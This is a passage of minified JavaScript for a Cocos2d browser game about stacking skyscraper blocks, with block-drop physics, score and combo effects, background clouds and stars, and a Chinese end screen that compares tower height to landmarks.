    cc.view.setDesignResolutionSize(320, 320 * (a.height / a.width), cc.ResolutionPolicy.FIXED_WIDTH);
    cc.view.resizeWithBrowserSize(e);
    cc.LoaderScene.preload(y.c.Kj, function() {
        y.c.init();
        cc.director.runScene(A.scene(y.c.qe))
    }, this)
};
cc.game.run();
y.c.init = function() {
    x.init();
    cc.spriteFrameCache.addSpriteFrames("texture.plist");
    cc.textureCache.addImage("mtl_link.png");
    A.ck();
    y.c = _(y.c).extend({
        bl: h,
        rg: cc.winSize.height / 2 - 75,
        ne: 100,
        re: 2.5,
        Ng: 1.8,
        yg: 100,
        Eg: 16,
        se: 8,
        xg: 0.4,
        lg: cc.p(0, -20),
        Pa: 5,
        Vg: 1,
        Kg: 2 * cc.winSize.width / 7,
        Lg: 5,
        Jg: 3,
        Qg: 2.2,
        Wg: 0.02,
        Sg: 0.04,
        pe: 0.45,
        tg: 0.7,
        Dg: 30,
        Fg: 15,
        vk: 80,
        wk: 50,
        Ag: 3,
        kg: 1,
        sg: 3,
        Og: 3,
        Rg: 0,
        Gg: 5,
        Bg: 0.6,
        Mg: 0.3,
        Cg: 6,
        jg: 0.75,
        Hg: 20,
        Pg: 2,
        Ig: 20,
        Ja: {
            Xd: 1,
            wo: 2,
            Yd: 0
        }
    })
};
y.c.qe = x.Layer.extend({
    ka: g,
    Ca: g,
    Mb: 0,
    Gb: 0,
    pd: h,
    xl: g,
    I: g,
    na: g,
    za: g,
    md: g,
    El: g,
    Cl: g,
    P: g,
    e: g,
    ga: g,
    ctor: function() {
        this._super();
        this.init();
        y.c.Uf = A.Aj(1, 5);
        this.Vd()
    },
    Zi: function() {
        var a = this.Th = cc.LabelTTF.create("9G游戏", "Arial", 12);
        a.setHorizontalAlignment(cc.TEXT_ALIGNMENT_CENTER);
        x.ea(a, this, 0.5, 0);
        a.anchorY = 0;
        this.addChild(1);
        this.addChild(a);
        this.na = new y.c.Xg;
        this.addChild(this.na, -1);
        this.za = this.na.za;
        this.md = new y.c.wg;
        this.za.addChild(this.md);
        this.ga = new y.c.ng;
        this.I = this.na.I;
        this.I.Wf();
        this.I.Vf(y.c.rg, function() {
            x.Mc(this)
        }.bind(this));
        a = new cc.Sprite("mtl_lifepad.png");
        this.addChild(a);
        this.Gb = y.c.Ag;
        this.ka = cc.LabelTTF.create("", "Arial", 26);
        this.ka.setColor(cc.color(255, 237, 152));
        this.ka.enableStroke(cc.color(13, 54, 144), 3);
        this.ka.setString(this.Gb);
        this.addChild(this.ka);
        this.Ca = cc.LabelTTF.create("", "Arial", 26);
        this.Ca.setString(this.Mb);
        this.Ca.setColor(cc.color(255, 237, 152));
        this.Ca.enableStroke(cc.color(13, 54, 144), 3);
        this.addChild(this.Ca);
        a.attr({
            anchorX: 0,
            anchorY: 1,
            x: -3,
            y: cc.winSize.height + 5
        });
        this.ka.attr({
            anchorX: 0,
            anchorY: 1,
            x: 18,
            y: cc.winSize.height - 10
        });
        this.addChild(this.ka);
        this.Ca.attr({
            anchorX: 1,
            anchorY: 1,
            x: cc.winSize.width - 20,
            y: cc.winSize.height - 10
        });
        this.Nd(e);
        if (1 == y.c.Rf) {
            a = this.vf = x.Y.Bf("mtl_button_go.png", this.start.bind(this), this);
            a.$f(e);
            a.bk(cc.rect(0, 0, cc.winSize.width, cc.winSize.height));
            this.addChild(a);
            x.ea(a, this, 0.5, 0.3);
            var b = this.yf = new cc.Sprite("#mtl_title.png");
            this.addChild(b);
            b.x = cc.winSize.width / 2;
            b.y = a.y + 150;
            130 < cc.winSize.height - b.y && (b.y = cc.winSize.height - 130)
        } else this.start()
    },
    onTouchBegan: function() {
        this.ff && !this.pd && this.Ni();
        return h
    },
    Vd: function() {
        this.Zi();
        this.scheduleUpdate()
    },
    start: function() {
        this.vf && this.vf.setVisible(h);
        this.yf && this.yf.setVisible(h);
        this.Th.setVisible(h);
        this.ff = e
    },
    update: function(a) {
        this.na.step(a);
        this.ga.step(a);
        this.wj()
    },
    Ni: function() {
        var a = this.I.M;
        if (a) {
            this.I.bi();
            this.e = a;
            this.Oh(a, this.za, this.ga.G.length);
            var b = this.ca().W(),
                c = a.W(),
                b = cc.pMidpoint(c[0], c[1]).y - cc.pMidpoint(b[2], b[3]).y;
            a.Cd = a.getRotation() / (b / a.Fc.y);
            y.c.da("building_drop");
            this.pd = e;
            this.scheduleOnce(function() {
                this.pd = h
            }.bind(this), 0.3)
        }
    },
    Hf: function(a) {
        var b = this.e,
            c = cc.p(0, 3);
        if (b.qd) this.Ii(), this.I.Vf(y.c.ne, function() {
            x.Mc(this)
        }.bind(this));
        else {
            var d = Math.abs(a);
            b.R = a;
            d < y.c.pe && (d <= y.c.Sg ? (this.Vi(), this.Ui(), y.c.da("building_combo")) : (this.Ti(), this.Kc()), this.ga.Sf(this.e), this.Xi(), this.Qi(), y.c.da("building_bump"));
            d >= y.c.pe && (this.Kc(), d <= y.c.tg ? (this.If(), 0 != this.ca().R && this.Jf()) : 0 == this.ca().R ? (this.If(), this.Jf()) : this.Mi(), this.Kf(), y.c.da("building_miss"))
        }
        this.na.gg(0.6, c);
        this.Li();
        this.e = g;
        this.Nd(h)
    },
    Ii: function() {
        var a = this.e;
        this.Ga(a, 1.2, 8);
        a.R = 0;
        this.ga.Sf(a);
        cc.p(this.e.getContentSize().width / 2, 0)
    },
    Vi: function() {
        var a = this.e.W(),
            b = cc.pMult(cc.p(a[1].x - a[0].x, 0), this.e.R);
        this.e.setPosition(cc.pSub(this.e.getPosition(), b));
        this.e.R = 0;
        this.e.Ob = y.c.Ja.Yd;
        this.Ga(this.e, 1.2, 8);
        a = this.e.convertToNodeSpace(cc.pMidpoint(a[0], a[1]));
        this.Pj(a)
    },
    Ti: function() {
        this.e.setRotation(this.e.R * y.c.Dg);
        this.e.Ob = y.c.Ja.Xd;
        this.Ga(this.e, 0.8, 5);
        cc.p(this.e.getContentSize().width / 2, 0)
    },
    If: function() {
        this.be(this.e);
        this.Ga(this.e, 0.4, 6)
    },
    Jf: function() {
        var a = this.ca();
        a.setRotation(a.R * y.c.Fg);
        a.Ob = y.c.Ja.Xd;
        this.Ga(a, 0.6, 5)
    },
    Mi: function() {
        this.be(this.e);
        this.Ga(this.e, 0.4, 6);
        this.be(this.ca(), 0.1);
        this.Ga(this.ca(), 0.4, 6);
        this.ga.Jj()
    },
    Oi: function() {
        this.e.removeFromParent(e);
        this.e = g;
        this.Nd(h);
        this.na.gg(0.3, cc.p(0, 5));
        this.Kc();
        this.Kf()
    },
    Qi: function() {
        var a = this.ga.Z / y.c.Pa,
            b = y.c.re,
            c = y.c.se,
            c = c + (y.c.Eg - c) * a;
        this.I.nd = b - (b - y.c.Ng) * a;
        this.I.od = c
    },
    Xi: function() {
        var a = y.c.kg * (this.P ? this.P.Ya : 1);
        this.Mb += a;
        this.Ca.setString(this.Mb);
        a = cc.LabelTTF.create("+" + a, "Helvetica-Bold", 40);
        a.enableStroke(cc.color(13, 54, 144), 3);
        this.addChild(a);
        var b = this.ca(),
            b = b.getParent().convertToWorldSpace(b.getPosition());
        a.setPosition(this.convertToNodeSpace(b));
        var b = [],
            c = cc.ob.create(cc.MoveBy.create(1, cc.p(0, 100)), 3);
        b.push(c);
        var d = cc.FadeTo.create(1, 0);
        b.push(d);
        if (this.P) {
            var f = cc.Ma.create(cc.ScaleTo.create(0.5, 1.6)),
                l = cc.ScaleTo.create(0.5, 1.2),
                f = cc.Sequence.create(f, l);
            b.push(f);
            b = cc.Spawn.create(c, d, f)
        } else b = cc.Spawn.create(c, d);
        c = cc.RemoveSelf.create();
        a.runAction(cc.Sequence.create(b, c))
    },
    Ui: function() {
        this.P ? this.P.Pf() : (this.P = new y.c.Tg, this.P.Qd = this, this.addChild(this.P), this.P.setScale(0.6), x.ea(this.P, this, 0.5, 0.55))
    },
    Kc: function() {
        this.P && (this.P.removeFromParent(e), this.P = g)
    },
    Kf: function() {
        this.Gb--;
        this.ka.setString(this.Gb);
        0 == this.Gb && this.Si()
    },
    Si: function() {
        this.ff = h;
        this.scheduleOnce(this.Pi, 0.5)
    },
    Pi: function() {
        this.unscheduleUpdate();
        var a = y.c.Nf = this.Mb;
        dp_submitScore(a);
        b = _.sprintf("你把摩天楼盖到了%d层，和【%s】一样高，分享到朋友圈和小伙伴比比吧！", a, y.c.Gf());
        A.Ia("end", "score", a);
        b = new y.c.oe(b, "再玩一次",
            function() {
                //this.fg(a)
                this.Oj();
            }.bind(this), "更多游戏",
            function() {
                //this.fg(a);
                //this.Rc()
                this.pj();
            }.bind(this));
        this.addChild(b);
        x.Pd(b)
    },
    fg: function() {
        var a = this.Xp = new y.c.oe("", "再玩一次", this.Oj.bind(this), "玩玩别的", this.pj.bind(this));
        this.addChild(a);
        x.Pd(a)
    },
    Oj: function() {
        A.Ia("replay");
        y.c.Rf++;
        cc.director.runScene(A.scene(new y.c.qe(e)))
    },
    pj: function() {
        A.Ia("more");
        clickMore();
    },
    Rc: function() {
        A.Ia("share");
        var a = this.ar = new y.c.Yg;
        this.addChild(a)
    },
    Li: function() {
        if (!(1 >= this.ga.G.length)) {
            var a = this.ca().W(),
                a = cc.pMidpoint(a[2], a[3]);
            this.na.ek(0.3, cc.p(0, cc.winSize.height - y.c.ne - 300 - a.y))
        }
    },
    Nd: function(a) {
        a = new y.c.mg(a);
        a.setVisible(h);
        this.I.getParent().addChild(a, -1);
        this.I.Yi(a)
    },
    be: function(a, b) {
        var c = cc.DelayTime.create(b || 0),
            d = this.Bi(a.R),
            f = (80 + 50 * Math.random()) * d,
            l = a.W(),
            m = -cc.pDistance(l[0], l[2]),
            l = cc.p(f / 2, 20),
            r = cc.p(f, -m / 2),
            f = cc.p(f, m),
            f = cc.BezierBy.create(0.8, [l, r, f]),
            d = (90 + 90 * Math.random()) * d,
            d = cc.RotateBy.create(0.8, d),
            l = cc.RemoveSelf.create(),
            c = cc.Sequence.create(c, cc.Spawn.create(f, d), l);
        a.runAction(c)
    },
    Pj: function(a) {
        var b = y.c.Ea("blast.png");
        b.setScale(0);
        b.setPosition(a);
        this.e.addChild(b, -1);
        a = cc.FadeTo.create(0.5, 0);
        var c = cc.Ma.create(cc.ScaleTo.create(0.5, 1.5));
        a = cc.Spawn.create(a, c);
        c = cc.RemoveSelf.create();
        a = cc.Sequence.create(a, c);
        b.runAction(a)
    },
    Ga: function(a, b, c) {
        var d = c ? 1 - c / 20 : 0.9;
        a.setScaleX(c ? 1 + c / 40 : 1.05);
        a.setScaleY(d);
        a.runAction(cc.La.create(cc.ScaleTo.create(b || 0.6, 1, 1)))
    },
    wj: function() {
        this.vj()
    },
    vj: function() {
        if (this.e) {
            var a = cc.pAdd(this.e.getPosition(), this.e.Fc);
            this.e.setPosition(a);
            a = this.e.getRotation() + this.e.Cd;
            0.1 >= Math.abs(a) ? (this.e.setRotation(0), this.e.Cd = 0) : this.e.setRotation(a);
            this.tj();
            this.uj()
        }
    },
    tj: function() {
        if (this.e) {
            var a = this.e.W(),
                b = this.ca().W(),
                c = this.e.Fc;
            if (b = this.oi(a, b, c)) {
                var d = cc.pLengthSQ(b),
                    c = cc.pLengthSQ(c);
                d > 4 * c ? this.Hf(1) : (a = cc.pMidpoint(a[0], a[1]), c = this.e.convertToWorldSpace(cc.p(0, 0)), a = cc.pSub(a, c), c = this.e.getContentSize(), a = cc.p(a.x / c.width, a.y / c.height), c = this.ki(this.e, a), this.e.setPosition(cc.pAdd(cc.pAdd(this.e.getPosition(), b), c)), this.e.setAnchorPoint(a), b = this.Ci(this.e.W(), this.ca().W()), this.Hf(b))
            }
        }
    },
    uj: function() {
        if (this.e) {
            var a = this.e.W();
            0 >= _.max(a, function(a) {
                return a.y
            }).y && this.Oi()
        }
    },
    ca: function() {
        return this.ga.Ud() || this.md
    },
    Ci: function(a, b) {
        var c = cc.pMidpoint(a[0], a[1]),
            d = cc.pMidpoint(b[2], b[3]);
        return (c.x - d.x) / (a[1].x - a[0].x)
    },
    Bi: function(a) {
        return 0 == a ? 0 : 0 > a ? -1 : 1
    },
    ki: function(a, b) {
        var c = a.getContentSize(),
            d = a.getAnchorPoint(),
            d = cc.p(d.x * c.width, d.y * c.height),
            d = a.convertToWorldSpace(d),
            d = a.getParent().convertToNodeSpace(d),
            c = cc.p(b.x * c.width, b.y * c.height),
            c = a.convertToWorldSpace(c),
            c = a.getParent().convertToNodeSpace(c);
        return cc.pSub(c, d)
    },
    oi: function(a, b, c) {
        if (!this.ij(a, b)) return g;
        a = cc.pMidpoint(a[0], a[1]);
        c = cc.pSub(a, c);
        b = cc.pIntersectPoint(a, c, b[2], b[3]);
        return cc.pSub(b, a)
    },
    Ef: function(a, b) {
        var c = this.Di(b, 3),
            d = [];
        _.each(a, function(a) {
            _.each(c, function(b) {
                this.hj(a, b) && d.push(a)
            }.bind(this))
        }.bind(this));
        return d
    },
    Di: function(a, b) {
        var c = [],
            d = 0;
        do {
            for (var f = [], l = d; l < d + b; l++) f.push(a[l]);
            c.push(f);
            d++
        } while (d + b <= a.length);
        return c
    },
    hj: function(a, b) {
        var c = b[0],
            d = b[1],
            f = cc.pSub(b[2], c),
            l = cc.pSub(d, c),
            m = cc.pSub(a, c),
            c = cc.pDot(f, f),
            d = cc.pDot(f, l),
            f = cc.pDot(f, m),
            r = cc.pDot(l, l),
            l = cc.pDot(l, m),
            m = 1 / (c * r - d * d),
            r = (r * f - d * l) * m;
        if (0 > r || 1 < r) return h;
        c = (c * l - d * f) * m;
        return 0 > c || 1 < c ? h : 1 >= r + c
    },
    ij: function(a, b) {
        var c = this.Ef(a, b),
            d = this.Ef(b, a);
        return 0 < c.concat(d).length
    },
    Oh: function(a, b, c) {
        var d = a.getParent().convertToWorldSpace(a.getPosition()),
            d = b.convertToNodeSpace(d);
        a.retain();
        a.removeFromParent(h);
        b.addChild(a, c);
        a.setPosition(d);
        a.release()
    }
});
y.c.ng = cc.Class.extend({
    G: g,
    Z: 0,
    ph: 0,
    mc: 0,
    Va: 0,
    oh: 0,
    kc: 0,
    ctor: function() {
        this.G = [];
        this.Va = this.Z = 0
    },
    Ud: function() {
        return _.last(this.G)
    },
    Tm: function() {
        return this.G.length
    },
    Jj: function() {
        this.G.pop()
    },
    Sf: function(a) {
        this.Wi(Math.abs(a.R));
        this.Ji(a)
    },
    Wi: function(a) {
        this.G.length >= y.c.Vg && (this.Z < y.c.Pa ? (this.Z += a, 10 < this.G.length && 0 == this.Ud().R && (this.Z += 0.05), this.Z = cc.clampf(this.Z, 0, y.c.Pa)) : (this.Va += Math.abs(this.Ud().R), this.Va = cc.clampf(this.Va, 0, y.c.Pa)));
        this.mc = this.Z / y.c.Pa;
        this.kc = this.Va / y.c.Pa
    },
    Ji: function(a) {
        if (0 == this.G.length) a.S = 0, a.pa = this.getDuration(this.kc), a.bb = this.mc, a.Ra = cc.p(a.getPosition().x, a.getPosition().y), a.ad = cc.p(0, 0);
        else {
            var b = _.last(this.G),
                c;
            c = 0 == a.R ? b.S : b.S - y.c.Wg;
            a.S = 0 > c ? b.pa - c : c;
            a.pa = b.pa;
            a.bb = b.bb;
            a.Ra = cc.p(this.G[0].Ra.x, a.getPosition().y);
            b = Math.sin(2 * Math.PI * a.S / a.pa);
            c = a.bb;
            b = cc.pMult(cc.p(this.Ff(c), 0), b * c);
            a.ad = cc.pSub(a.getPosition(), cc.pAdd(a.Ra, b))
        }
        this.G.push(a)
    },
    step: function(a) {
        0 != this.G.length && (_.each(this.G, function(b, c) {
            var d = b.bb;
            b.S = b.S >= b.pa ? 0 : b.S;
            0 == b.S && (b.pa = this.getDuration(this.kc), b.bb = this.mc, 0 == c && (this.ph = this.mc, this.oh = this.kc));
            this.qk(b, d, Math.sin(2 * Math.PI * b.S / b.pa));
            b.S += a
        }.bind(this)), this.Ki())
    },
    qk: function(a, b, c) {
        var d = cc.pMult(cc.p(this.Ff(b), 0), c * b);
        a.sd || (a.sd = e);
        d = cc.pAdd(cc.pAdd(a.Ra, d), a.ad);
        a.setPosition(d);
        b *= this.Fi(b) * c;
        switch (a.Ob) {
            case y.c.Ja.Xd:
                b = (b - a.getRotation()) / 10;
                a.setRotation(a.getRotation() + b);
                0.01 >= Math.abs(b) && (a.Ob = y.c.Ja.Yd);
                break;
            case y.c.Ja.Yd:
                a.setRotation(b)
        }
    },
    Ki: function() {
        _.each(this.G, function(a) {
            var b = a.W(),
                b = _.max(b, function(a) {
                    return a.y
                });
            0 >= b.y && a.isVisible() == e && a.setVisible(h);
            0 < b.y && a.isVisible() == h && a.setVisible(e)
        }.bind(this))
    },
    getDuration: function(a) {
        var b = y.c.Jg;
        return b - (b - y.c.Qg) * a
    },
    Ff: function(a) {
        return y.c.Kg * a
    },
    Fi: function(a) {
        return y.c.Lg * a
    }
});
y.c.Xg = cc.yb.extend({
    za: g,
    I: g,
    sc: 0,
    of: g,
    nf: g,
    mf: 0,
    xd: h,
    zc: 0,
    Nb: g,
    Ac: g,
    tf: 0,
    Ed: h,
    dd: g,
    Db: g,
    Ta: g,
    Cc: g,
    ed: 0,
    hc: 0,
    Bc: 0,
    Hd: 0,
    ctor: function() {
        this._super();
        this.init();
        this.Vd()
    },
    Vd: function() {
        var a = cc.winSize,
            b = cc.Node.create();
        this.addChild(b, -2, cc.p(0, 0.7), cc.p(0, 0));
        cc.size(0, 0);
        var c = cc.color(92, 200, 236, 255),
            d = cc.color(22, 61, 107, 255),
            f = cc.color(46, 55, 119, 255),
            l = cc.color(26, 33, 74, 255),
            m = cc.size(a.width, 10 * a.height),
            c = cc.LayerGradient.create(c, d, cc.p(0, 1));
        c.setContentSize(m);
        c.setPosition(cc.p(0, 0));
        b.addChild(c, -1);
        c = 0 + m.height - 1;
        d = cc.LayerGradient.create(d, f, cc.p(0, 1));
        d.setContentSize(m);
        d.setPosition(cc.p(0, c));
        b.addChild(d, -1);
        d = c + m.height - 1;
        f = cc.LayerGradient.create(f, l, cc.p(0, 1));
        f.setContentSize(m);
        f.setPosition(cc.p(0, d));
        b.addChild(f, -1);
        f = d + m.height - 1;
        l = cc.LayerColor.create(l);
        l.setContentSize(cc.size(m.width, 1E3 * m.height));
        l.setPosition(cc.p(0, f));
        b.addChild(l, -1);
        b = [0.6, 0.3, 0.15, 0.075];
        for (l = 4; 1 <= l; l--) {
            var r = y.c.Ea("back_layer" + l + ".png");
            r.setAnchorPoint(cc.p(0, 0));
            this.addChild(r, -2, cc.p(0, b[l - 1]), cc.p(0, 0))
        }
        b = y.c.Ea("grass.png");
        b.setAnchorPoint(cc.p(0, 0));
        this.addChild(b, -2, cc.p(0, 1), cc.p(0, 0));
        this.za = cc.Node.create();
        this.addChild(this.za, 0, cc.p(1, 1), cc.p(0, 0));
        b = cc.Node.create();
        this.addChild(b, 0, cc.p(1, 0), cc.p(a.width / 2, a.height));
        this.I = new y.c.zg;
        b.addChild(this.I);
        this.dd = cc.Node.create();
        this.addChild(this.dd, 2, cc.p(0, 1.1), cc.p(0, 0));
        this.Db = cc.Node.create();
        this.addChild(this.Db, -5, cc.p(0, 0.6), cc.p(0, 0));
        this.ed = a.height;
        this.hc = d - m.height / 3;
        this.Bc = c;
        this.Hd = f + 1E3 * m.height;
        this.Ta = [];
        this.Cc = []
    },
    Vh: function() {
        if (!(this.Ta.length >= y.c.Cg)) {
            var a = cc.winSize,
                b = this.convertToWorldSpace(cc.p(0, this.ed)).y;
            if (!(b > a.height)) {
                var b = Math.max(0, b),
                    c = this.convertToWorldSpace(cc.p(0, this.hc)).y;
                if (!(0 > c)) {
                    var c = Math.min(2 * a.height, c),
                        d = cc.p(2 * (Math.random() * a.width / 3), x.Xc(b, c)),
                        b = g,
                        f = c = 0;
                    Math.random() < y.c.jg ? (b = this.Db, c = 255 * (0.95 - 0.15 * Math.random()), f = 0.6 + 0.3 * Math.random()) : (b = this.dd, c = 255 * (0.7 - 0.5 * Math.random()), f = 1 + 0.6 * Math.random());
                    var l = y.c.Ea("cloud.png"),
                        d = b.convertToNodeSpace(d);
                    l.setAnchorPoint(cc.p(0.5, 0));
                    l.setPosition(d);
                    b.addChild(l);
                    l.setScale(0);
                    l.setOpacity(0);
                    this.Ta.push(l);
                    var b = 8 + 7 * Math.random() / f,
                        f = cc.La.create(cc.ScaleTo.create(b / 20, f)),
                        c = cc.FadeTo.create(b / 40, c),
                        c = cc.Spawn.create(f, c),
                        f = cc.DelayTime.create(8 * (b / 10)),
                        d = cc.fb.create(cc.ScaleTo.create(b / 20, 0)),
                        m = cc.FadeTo.create(b / 40, 0),
                        d = cc.Spawn.create(d, m),
                        m = cc.CallFunc.create(function() {
                            this.Hj(l)
                        }.bind(this)),
                        c = cc.Sequence.create(c, f, d, m),
                        a = cc.p(a.width / 2 + Math.random() * a.width / 2, 0),
                        a = cc.MoveBy.create(b, a),
                        a = cc.Spawn.create(c, a);
                    l.runAction(a)
                }
            }
        }
    },
    Hj: function(a) {
        this.Ta.splice(_.indexOf(this.Ta, a), 1);
        a.removeFromParent(e)
    },
    Wh: function() {
        if (!(this.Ta.length >= y.c.Ig)) {
            var a = cc.winSize,
                b = this.convertToWorldSpace(cc.p(0, this.Bc)).y;
            if (!(b > a.height)) {
                var b = Math.max(0, b),
                    c = this.convertToWorldSpace(cc.p(0, this.Hd)).y;
                if (!(0 > c)) {
                    var c = Math.min(2 * a.height, c),
                        a = cc.p(2 * (Math.random() * a.width / 3), x.Xc(b, c)),
                        a = this.Db.convertToNodeSpace(a),
                        b = "star_" + Math.floor(2 * Math.random()) + ".png",
                        d = y.c.Ea(b);
                    d.setPosition(a);
                    this.Db.addChild(d);
                    d.setOpacity(0);
                    d.setScale(0.6);
                    this.Cc.push(d);
                    var a = cc.DelayTime.create(1 - Math.random()),
                        b = cc.FadeTo.create(0.3, 191.25),
                        c = cc.ScaleTo.create(0.8, 1),
                        b = cc.Spawn.create(b, c),
                        c = cc.FadeTo.create(0.4, 0),
                        f = cc.ScaleTo.create(1, 0.6),
                        c = cc.Spawn.create(c, f),
                        b = cc.nb.create(cc.Sequence.create(b, c), 3),
                        c = cc.RotateBy.create(1.8, x.Xc(-180, 180)),
                        b = cc.Spawn.create(b, c),
                        c = cc.CallFunc.create(function() {
                            this.Ij(d)
                        }.bind(this)),
                        a = cc.Sequence.create(a, b, c);
                    d.runAction(a)
                }
            }
        }
    },
    Ij: function(a) {
        this.Cc.splice(_.indexOf(this.Cc, a), 1);
        a.removeFromParent(e)
    },
    gg: function(a, b) {
        this.tf = a;
        this.Nb = b;
        this.Ac = cc.p(0, 0);
        this.zc = 0;
        this.Ed = e
    },
    ek: function(a, b) {
        this.mf = a;
        this.of = b;
        this.nf = cc.p(this.getPositionX(), this.getPositionY());
        this.sc = 0;
        this.xd = e
    },
    step: function(a) {
        this.xd && (this.sc += a, time_ = this.sc / this.mf, time_ = 1 < time_ ? 1 : time_, this.ok(time_));
        this.Ed && (this.zc += a, time_ = this.zc / this.tf, time_ = 1 < time_ ? 1 : time_, this.pk(time_));
        this.Ri()
    },
    ok: function(a) {
        var b = cc.pMult(this.of, 0 === a || 1 == a ? a : -0.5 * (Math.cos(Math.PI * a) - 1));
        this.setPosition(cc.pAdd(this.nf, b));
        1 == a && (this.xd = h)
    },
    pk: function(a) {
        var b = -this.Nb.x + 2 * Math.random() * this.Nb.x,
            c = -this.Nb.y + 2 * Math.random() * this.Nb.y,
            b = cc.p(b, c);
        1 == a ? (a = cc.pSub(this.getPosition(), this.Ac), this.Ed = h) : (a = cc.pSub(this.getPosition(), this.Ac), a = cc.pAdd(a, b));
        this.setPosition(a);
        this.Ac = b
    },
    Ri: function() {
        var a = this.convertToNodeSpace(cc.p(0, cc.winSize.height / 2)).y,
            b = (this.hc - a) / (this.hc - this.ed),
            b = cc.clampf(b, 0, 1),
            c = y.c.Mg,
            b = (c + (y.c.Bg - c) * b) / 60;
        Math.random() < b && this.Vh();
        a = (a - this.Bc) / (this.Hd - this.Bc);
        a = cc.clampf(a, 0, 1);
        b = y.c.Pg;
        a = (b + (y.c.Hg - b) * a) / 60;
        Math.random() < a && this.Wh()
    }
});
y.c.te = cc.Sprite.extend({
    V: g,
    la: g,
    Fc: g,
    Cd: 0,
    ctor: function(a, b, c, d) {
        this._super();
        this.V = cc.p(a, b);
        this.la = cc.size(c, d)
    },
    wn: p("V"),
    xn: p("la"),
    W: function() {
        return [this.xi(), this.yi(), this.Ai(), this.zi()]
    },
    xi: function() {
        return this.convertToWorldSpace(this.V)
    },
    yi: function() {
        var a = cc.p(this.V.x + this.la.width, this.V.y);
        return this.convertToWorldSpace(a)
    },
    zi: function() {
        var a = cc.p(this.V.x, this.V.y + this.la.height);
        return this.convertToWorldSpace(a)
    },
    Ai: function() {
        var a = cc.p(this.V.x + this.la.width, this.V.y + this.la.height);
        return this.convertToWorldSpace(a)
    }
});
y.c.wg = y.c.te.extend({
    ctor: function() {
        this._super();
        this.init();
        this.setAnchorPoint(cc.p(0.5, 0));
        var a = cc.winSize.width;
        this.V = cc.p(0, 0);
        this.la = cc.size(a, 70)
    }
});
y.c.mg = y.c.te.extend({
    qd: g,
    R: g,
    Ob: g,
    sd: g,
    rc: 0,
    S: 0,
    bb: 0,
    pa: 0,
    Ra: g,
    ad: g,
    ctor: function(a) {
        this._super();
        this.qd = a;
        this.initWithSpriteFrame(y.c.Ha((a ? "base_" : "block_") + y.c.Uf + ".png"));
        this.setAnchorPoint(cc.p(0.5, 1));
        this.sd = h;
        this.Ra = cc.p(0, 0);
        this.Fc = y.c.lg;
        a = [75, 75, 75, 75, 62, 65][y.c.Uf];
        var b = this.getContentSize();
        this.V = cc.p(0, (b.height - a) / 2);
        this.la = cc.size(b.width, a)
    }
});
y.c.zg = cc.Sprite.extend({
    M: g,
    ab: g,
    ul: g,
    nd: g,
    od: g,
    ctor: function() {
        this._super();
        this.initWithSpriteFrame(y.c.Ha("rope.png"));
        this.setAnchorPoint(cc.p(0.5, 1));
        this.ab = y.c.Ea("sucker.png");
        this.addChild(this.ab);
        this.ab.setAnchorPoint(cc.p(0.5, 1));
        x.ea(this.ab, this, 0.5, 0);
        this.nd = y.c.re;
        this.od = y.c.se
    },
    onEnter: function() {
        this._super();
        this.getContentSize();
        this.scheduleUpdate()
    },
    Wf: function() {
        var a = this.nd / 4,
            b = y.c.yg / 2,
            c = this.od;
        this.setRotation(c);
        var d = cc.Oa.create(cc.MoveBy.create(a, cc.p(0, b))),
            f = cc.Na.create(cc.MoveBy.create(a, cc.p(0, -b))),
            l = cc.va.create(cc.RotateBy.create(2 * a, 2 * -c)),
            d = cc.Spawn.create(cc.Sequence.create(d, f), l),
            f = cc.Oa.create(cc.MoveBy.create(a, cc.p(0, -b))),
            b = cc.Na.create(cc.MoveBy.create(a, cc.p(0, b))),
            a = cc.va.create(cc.RotateBy.create(2 * a, 2 * c)),
            a = cc.Spawn.create(cc.Sequence.create(f, b), a),
            c = cc.CallFunc.create(this.Wf, this),
            a = cc.Sequence.create(d, a, c);
        this.runAction(a)
    },
    Vf: function(a, b) {
        var c = this.getPositionY(),
            d = this.getContentSize().height - a,
            c = cc.va.create(cc.MoveBy.create(1, cc.p(0, d - c))),
            d = cc.CallFunc.create(b),
            c = cc.Sequence.create(c, d);
        this.runAction(c)
    },
    Sm: p("M"),
    Yi: function(a) {
        this.M || (this.M = a)
    },
    bi: function() {
        this.M && (this.M = g)
    },
    update: function() {
        if (this.M) {
            this.M.isVisible() || this.M.setVisible(e);
            var a = this.getContentSize(),
                a = cc.p(a.width / 2, 0);
            if (this.M.qd) this.ab.setRotation(-this.getRotation());
            else {
                var b = y.c.xg,
                    b = this.getRotation() * b;
                this.M.setRotation(b);
                this.ab.setRotation(-b)
            }
            a = this.M.getParent().convertToNodeSpace(this.convertToWorldSpace(a));
            this.M.setPosition(a)
        }
    }
});
y.c.Tg = cc.Node.extend({
    Qd: g,
    Ya: 1,
    zl: g,
    qa: g,
    ctor: function() {
        this._super();
        this.init();
        var a = new cc.Sprite("#perfect_pad.png");
        this.addChild(a);
        a = y.c.Ea("perfect_bar.png");
        this.qa = cc.k.create(a);
        this.qa.Qc(cc.k.fc);
        this.qa.ag(cc.p(1, 0.5));
        this.qa.Xf(cc.p(1, 0));
        this.qa.cg(100);
        this.addChild(this.qa)
    },
    onEnter: function() {
        this._super();
        this.Pf()
    },
    Pf: function() {
        this.Ya += 1;
        this.Ya = cc.clampf(this.Ya, 0, y.c.Gg);
        this.qa.stopAllActions();
        var a = y.c.sg,
            b = a - y.c.Rg * (this.Ya - 1),
            b = cc.clampf(b, y.c.Og, a),
            a = cc.zb.create(b, 100, 0),
            b = cc.CallFunc.create(function() {
                this.Qd && this.Qd.Kc()
            }.bind(this));
        this.qa.runAction(cc.Sequence.create(a, b))
    }
});
y.c.cb = function(a) {
    return a
};
y.c.Ea = function(a) {
    return new cc.Sprite("#" + y.c.cb(a))
};
y.c.up = function(a) {
    return new cc.Sprite(y.c.cb(a))
};
y.c.Ha = function(a) {
    return x.Ha(y.c.cb(a))
};
y.c.ak = function(a, b, c) {
    b = y.c.Ha(b);
    a.setSpriteFrame(b);
    c && a.setContentSize(b.vi())
};
y.c.da = function(a) {
    x.ue.l().da(y.c.cb("sound/" + a + ".mp3"))
};
y.c.hp = function(a, b, c, d) {
    arguments[0] = y.c.cb(a);
    return cc.og.load.apply(cc.og, arguments)
};
y.c.Xl = function(a) {
    return cc.el.create(y.c.cb(a))
};
y.c.Gf = function() {
    var a;
    a = a || y.c.Nf;
    if (10 > a) return "潘长江";
    if (10 <= a && 20 > a) return "姚明";
    if (20 <= a && 30 > a) return "长颈鹿";
    if (30 <= a && 40 > a) return "天安门";
    if (40 <= a && 50 > a) return "自由女神";
    if (50 <= a && 60 > a) return "埃菲尔铁塔";
    if (60 <= a && 70 > a) return "东方明珠";
